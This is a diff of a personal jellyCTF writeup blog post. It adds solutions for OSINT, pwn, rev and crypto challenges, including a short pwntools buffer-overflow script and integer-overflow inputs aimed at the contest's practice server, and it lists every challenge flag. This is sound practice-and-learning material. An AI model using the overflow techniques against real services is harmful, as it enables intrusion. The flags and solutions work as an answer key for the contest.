@@ -11,9 +11,9 @@ description: jellyCTF writeups
 ---
 Sometime during the middle of last week I decided to actually start playing CTFs, and I remember dungwinix mentioned that jellyc.tf was going on for 2 weeks and that it was good for beginners (aka me). 
 
-> go check his writeups at https://dungwinux.github.io/-blog/security/2024/06/24/jellyctf.html, he actually was the first solo team to full clear w/o hints
+> go check his writeups at https://dungwinux.github.io/-blog/security/2024/06/24/jellyctf.html, he was the first solo team to full clear w/o hints (i think)
 
-I used a lot of hints (almost all of them), but I was able to solve 10/10 web, 6/8 osint, 3/3 pwn, 8/10 crypto, 6/7 forensics, 5/5 misc, 3/3 rev.
+I used a lot of hints (almost all of them), but I was able to solve 10/10 web, 6/8 osint, 3/3 pwn, 8/10 crypto, 6/7 forensics, 5/5 misc, 3/3 rev. Personally, I thought that the pwn and rev were lacking, but I learned a good amount in the other catagories.
 ![my "awards"](@assets/images/writeups/jellyctf/awardssmall.png)
 <div align="center" style="color:#888888"><em>My "awards"</em></div>
 
@@ -480,12 +480,123 @@ flag: `2016-09-15T15:01:46.233Z`
 
 ##### super_fan
 I had to use a hint for this: you need to find the twitter id of the user, which can be done through their banner on [wayback machine](https://web.archive.org/web/20240325165547/https://twitter.com/j3llyfan7)
-The id for the user is `1772301250572263429`, and 
+The id for the user is `1772301250572263429`, and according to [this site](https://twirpz.wordpress.com/2015/06/16/how-to-find-twitter-users-previous-usernames/), you can go to [https://x.com/intent/user?user_id=1772301250572263429](https://x.com/intent/user?user_id=1772301250572263429) to find the new account.
+The three posts
+```
+dGhpc193YXNfbm90X215X2ludGVudGlvbn0=
+eUNURns=
+amVsbA==
+```
+b64 decode to the flag.
+
+flag: `jellyCTF{this_was_not_my_intention}`
 
 # pwn
 <a href="#toc">back to TOC</a>
 <div id="pwn" />
+##### phase_coffee_1
+For all of these, the goal is to get enough money to buy [jelly's coffee](https://shop.phase-connect.com/collections/coffee/products/custom-roast-coffee-beans-hoshiumi-jelly)
+You can do an integer overflow to subtract negative money
+![rip opsec](https://github.com/atch2203/jellyctf/blob/main/pwn/phase_coffee_1/cashmoney.png?raw=true)
+
+flag: `jellyCTF{sakana_your_C04433_shop_broke}`
+
+##### phase_coffee_2
+The idea here is similar, except you can't put negative numbers as input. However, the program multiples your input by 35 to decide how much money to subtract, so you can still do an integer overflow with `61356699*35`.
+
+flag: `jellyCTF{dud3_y0u_m1ss3d_4n0th3r_bug}`
+
+##### phase_coffee_3
+This time you actually need to do a buffer overflow. 
+Using cyclic we find that `remaining_coin_balance` is an offset of 160 from the buffer. 
+![offset](https://github.com/atch2203/jellyctf/blob/main/pwn/phase_coffee_3/overflowpoc.png?raw=true)
+```python
+from pwn import *
+
+io = remote(host="chals.jellyc.tf", port=5002)
+
+io.sendline(b'2')
+io.sendline(b'1')
+io.sendline(b'1')
+io.sendline(cyclic(160)+p64(0x7fffffff))
+
+io.interactive()
+```
+
+flag: `jellyCTF{ph4se_c0nn3ct_15_definitely_a_coff33_comp4ny}`
 
 # rev
+<a href="#toc">back to TOC</a>
 <div id="rev" />
+##### awassmbely
+Replace each awa5.0 bit with binary, and then run the assembly by hand to get `11010000`, or 208
 
+flag: `jellyCTF{208}`
+
+##### lost_in_translation
+The script converts the flag to awascii, but it uses 8 bits instead of 6 bits. We just translate from awascii, using 8 bits per char.
+```python
+lookup = "AWawJELYHOSIUMjelyhosiumPCNTpcntBDFGRbdfgr0123456789 .,!'()~_/;\n"
+out = " awa awa awa awawawawa awa awa awa awa awawawawawa awa awa awawa awa awa awa awa awa awa awawa awa awa awa awa awa awa awawa awa awa awawa awa awa awawawa awa awawa awa awa awawawa awawawa awa awawa awa awa awawa awa awa awawawawa awa awawa awa awa awawawa awa awawa awa awawa awawa awawa awa awa awa awawawawa awa awa awa awawa awawa awawawa awa awawa awawawa awawa awa awawa awa awa awa awawa awa awawawawawa awa awa awa awa awawawawawawa awa awa awa awa awa awawawa awa awawa awawa awawa awa awa awawawawawa awa awa awa awawa awa awawa awawa awa awawa awawa awawawa awa awa awawawa awawawa awa awawawawawa awa awa awa awa awawawawawawa awa awawa awawa awawa awa awa awawa awawa awawa awa awa awawawawawa awa awa awa awa awa awawawa awawa awa awa awawa awawawa awa awa awa awawawa awa awawa awa awa awawa awa awawa awa awa awawawawa awawa awa"
+binary_awascii = out.replace(" awa", "0").replace("wa", "1")
+length = int(len(binary_awascii)/8);
+print(length)
+flag = ""
+for i in range(length):
+    c = binary_awascii[8*i:8*i+8]
+    ind = int(c, 2)
+    flag += lookup[ind]
+print(flag)
+```
+
+flag: `jellyCTF(C0p13D_tw0_b1T_t00_MuCh)`
+
+##### rev1
+Popping the binary into ghidra shows that the flag is `c^eer<M?tZX<*Ia,kX?*MX_)kX:Xik*g<,..v` rot 7.
+![ghidra](https://github.com/atch2203/jellyctf/blob/main/rev/rev1chall/ghidra.png?raw=true)
+We do the same thing to get the flag.
+```python
+f = 'c^eer<M?tZX<*Ia,kX?*MX_)kX:Xik*g<,..v'
+res = ""
+for c in f:
+    res += chr(ord(c)+7)
+print(res)
+# could be 1 line but who cares
+```
+
+flag: `jellyCTF{a_C1Ph3r_F1T_f0r_A_pr1nC355}`
+
+# Things I didn't solve
+##### osint: stalknights_2
+I found the "bright festival" sign and a "28 pizza" restaurant, as well as some tier bikes in the photo. However, I looked at the wrong [bright festival](https://connect.brightfestival.com/past_editions/leipzig-2023/). It happens that [tier bikes](https://www.tier.app/en/where-to-find-us) exist both in leipzig and brussels(which should have been obvious b/c waffles), and I was stuck searching around leipzig to no avail.
+
+You can see the 28 restaurant + the park railing in [google maps](https://www.google.com/maps/@50.8450276,4.356176,3a,87y,32.03h,69.32t/data=!3m7!1e1!3m5!1s6JwJk4AXiLB2oMajwppE7w!2e0!6shttps:%2F%2Fstreetviewpixels-pa.googleapis.com%2Fv1%2Fthumbnail%3Fpanoid%3D6JwJk4AXiLB2oMajwppE7w%26cb_client%3Dmaps_sv.share%26w%3D900%26h%3D600%26yaw%3D32.03466108810561%26pitch%3D20.68420096741795%26thumbfov%3D90!7i16384!8i8192?coh=205410&entry=ttu)
+
+flag: `jellyCTF{square_de_la_putterie}`
+
+##### osint: stalknights_5
+Since the twitter user is a programmer (presumably), you can find their [leetcode profile](https://leetcode.com/u/starknight1337/).
+
+flag: `jellyCTF{1337code_0n_str34m}`
+
+##### crypto: you're_based
+I decoded the base64 to 
+```
+That was just a warm up. Here is the actual flag, though you may need a base that's 'A' bit larger:
+é©ªê¬ç¡¹ç­ð»æ¨é³æ©©êðµé´é¡æ¥¢æ³é£ð¡ð¡ð¡ð¡ð­ð °
+```
+However, I wasn't able to crack the gibberish, even when going to [base65535](https://www.better-converter.com/Encoders-Decoders/Base65536-Decode).
+
+It turns out that the text should have been decoded to `驪ꍬ硹答𓉻晨鑳橩ꅟ𓅵鑴鑡楢晳鑣𔕡𔕡𔕡𓁡𓍭𠍰`, which works when put into the base65535 link.
+
+flag: `jellyCTF{th1s_i5_just_a_b4s1c_awawawarmup}`
+
+##### crypto: you're_bababased?
+I didn't really attempt this as I didn't solve the prequel, but the solution can be found [here](https://github.com/sa1181405/pbchocolate-ctf/blob/main/jellyctf/crypto/you're_bababased/you're_bababased.md) or on other writeups. Essentially, you have to 
+1) convert the characters into their indices in `list_of_safe_unicode_chars.txt`
+2) convert that into base `0xbaba`
+3) convert that to ascii
+
+flag: `jellyCTF{baba_is_cool_but_j3lly_i5_COOLER}`
+
+##### forensics: oshi_mark
